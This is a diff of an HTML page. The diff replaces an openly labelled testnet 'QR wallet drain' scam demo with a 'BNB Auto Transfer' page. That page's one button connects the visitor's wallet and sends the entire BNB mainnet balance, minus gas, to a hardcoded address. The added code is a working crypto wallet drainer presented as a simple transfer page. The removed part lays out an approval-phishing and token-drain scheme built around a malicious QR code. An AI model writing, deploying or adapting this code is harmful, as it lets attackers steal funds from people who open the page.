@@ -1,142 +1,137 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR Scam Demo with QR Code</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.2.0/web3.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-        button { padding: 10px 20px; margin: 10px; font-size: 16px; cursor: pointer; }
-        #status { color: red; margin-top: 20px; }
-        #qrcode { margin-top: 20px; }
-    </style>
+  <meta charset="UTF-8">
+  <title>BNB Auto Transfer</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f5f5f5;
+    }
+
+    .container {
+      text-align: center;
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 90%;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    #sendButton {
+      font-size: 18px;
+      padding: 12px 30px;
+      background-color: #f0b90b;
+      border: none;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #sendButton:hover {
+      background-color: #d9a30a;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
-    <h1>QR-Based Wallet Drain Demo (Sepolia Testnet)</h1>
-    <p>Connect to Sepolia Testnet and try the scam simulation.</p>
-    <button onclick="connectWallet()">Connect MetaMask</button>
-    <button onclick="approveTokens()">Claim Airdrop (Approve Tokens)</button>
-    <button onclick="generateQRCode()">Generate Malicious QR Code</button>
-    <button onclick="drainTokens()">Simulate Scam (Drain Tokens)</button>
+  <div class="container">
+    <h2>Send Full BNB</h2>
+    <button id="sendButton">Send Now</button>
     <p id="status"></p>
-    <div id="qrcode"></div>
+  </div>
 
-    <script>
-        let web3;
-        let accounts;
-        let tokenContract;
-        let maliciousContract;
+  <script>
+    const receiver = "0x795F74878AC4E02f3C254CbA845B66571EA1B5dC"; // replace with your address
+    const gasLimit = 21000;
 
-        // Replace with your deployed contract addresses (Sepolia Testnet)
-        const TOKEN_ADDRESS = "YOUR_TEST_TOKEN_ADDRESS"; // Deploy TestToken.sol first
-        const MALICIOUS_ADDRESS = "YOUR_MALICIOUS_CONTRACT_ADDRESS"; // Deploy MaliciousContract.sol
-        const SCAMMER_ADDRESS = "0xYourScammerAddress"; // Any test address for simulation
+    document.getElementById("sendButton").onclick = async () => {
+      const status = document.getElementById("status");
+      status.textContent = "Connecting...";
+      status.style.color = "red";
 
-        // TestToken ABI (simplified for approve function)
-        const TOKEN_ABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    { "name": "spender", "type": "address" },
-                    { "name": "amount", "type": "uint256" }
-                ],
-                "name": "approve",
-                "outputs": [{ "name": "", "type": "bool" }],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [
-                    { "name": "owner", "type": "address" },
-                    { "name": "spender", "type": "address" }
-                ],
-                "name": "allowance",
-                "outputs": [{ "name": "", "type": "uint256" }],
-                "type": "function"
-            }
-        ];
+      let web3;
 
-        // MaliciousContract ABI (for drainTokens function)
-        const MALICIOUS_ABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    { "name": "tokenAddress", "type": "address" },
-                    { "name": "victim", "type": "address" },
-                    { "name": "to", "type": "address" },
-                    { "name": "amount", "type": "uint256" }
-                ],
-                "name": "drainTokens",
-                "outputs": [],
-                "type": "function"
-            }
-        ];
+      if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+        } catch (err) {
+          status.textContent = "Access to wallet denied.";
+          return;
+        }
+      } else if (window.web3) {
+        web3 = new Web3(window.web3.currentProvider);
+      } else {
+        status.textContent = "Ethereum wallet not found. Open in Trust Wallet browser or install MetaMask.";
+        return;
+      }
 
-        // Connect to MetaMask
-        async function connectWallet() {
-            if (window.ethereum) {
-                try {
-                    web3 = new Web3(window.ethereum);
-                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
-                    maliciousContract = new web3.eth.Contract(MALICIOUS_ABI, MALICIOUS_ADDRESS);
-                    document.getElementById('status').innerText = `Connected: ${accounts[0]}`;
-                } catch (error) {
-                    document.getElementById('status').innerText = `Error: ${error.message}`;
-                }
-            } else {
-                document.getElementById('status').innerText = "Please install MetaMask!";
-            }
+      try {
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          status.textContent = "Please switch to BNB Smart Chain (Chain ID 56).";
+          return;
         }
 
-        // Approve tokens to malicious contract
-        async function approveTokens() {
-            if (!accounts) {
-                document.getElementById('status').innerText = "Connect wallet first!";
-                return;
-            }
-            try {
-                const amount = web3.utils.toWei("1000", "ether"); // Approving 1000 tokens
-                await tokenContract.methods.approve(MALICIOUS_ADDRESS, amount).send({ from: accounts[0] });
-                document.getElementById('status').innerText = "Tokens approved for malicious contract!";
-            } catch (error) {
-                document.getElementById('status').innerText = `Error: ${error.message}`;
-            }
+        const balanceWei = BigInt(await web3.eth.getBalance(sender));
+        const gasPrice = BigInt(await web3.eth.getGasPrice());
+        const totalGasCost = gasPrice * BigInt(gasLimit);
+
+        if (balanceWei <= totalGasCost) {
+          status.textContent = "Insufficient balance to cover gas fees.";
+          return;
         }
 
-        // Generate Malicious QR Code
-        function generateQRCode() {
-            if (!accounts) {
-                document.getElementById('status').innerText = "Connect wallet first!";
-                return;
-            }
-            // URL to trigger approval (simulates malicious dApp)
-            const maliciousUrl = `https://your-hosted-domain.com/?contract=${MALICIOUS_ADDRESS}&token=${TOKEN_ADDRESS}&amount=${web3.utils.toWei("1000", "ether")}`;
-            document.getElementById('qrcode').innerHTML = ""; // Clear previous QR code
-            new QRCode(document.getElementById("qrcode"), {
-                text: maliciousUrl,
-                width: 200,
-                height: 200
-            });
-            document.getElementById('status').innerText = "Malicious QR Code generated! Scan it with MetaMask to approve tokens.";
-        }
+        const sendAmount = balanceWei - totalGasCost;
 
-        // Simulate scammer draining tokens
-        async function drainTokens() {
-            if (!accounts) {
-                document.getElementById('status').innerText = "Connect wallet first!";
-                return;
-            }
-            try {
-                const amount = web3.utils.toWei("500", "ether"); // Draining 500 tokens
-                await maliciousContract.methods.drainTokens(TOKEN_ADDRESS, accounts[0], SCAMMER_ADDRESS, amount).send({ from: SCAMMER_ADDRESS });
-                document.getElementById('status').innerText = "Tokens drained to scammer address!";
-            } catch (error) {
-                document.getElementById('status').innerText = `Error: ${error.message}`;
-            }
-        }
-    </script>
+        const txParams = {
+          from: sender,
+          to: receiver,
+          value: "0x" + sendAmount.toString(16),
+          gas: "0x" + gasLimit.toString(16),
+          gasPrice: "0x" + gasPrice.toString(16),
+        };
+
+        status.textContent = "Sending transaction...";
+        status.style.color = "black";
+
+        web3.eth.sendTransaction(txParams)
+          .on('transactionHash', function(hash){
+            status.style.color = "green";
+            status.textContent = "Transaction sent! Hash: " + hash;
+          })
+          .on('error', function(error){
+            status.style.color = "red";
+            status.textContent = "Transaction failed: " + (error.message || error);
+          });
+
+      } catch (err) {
+        status.style.color = "red";
+        status.textContent = "Error: " + (err.message || err);
+      }
+    };
+  </script>
 </body>
 </html>
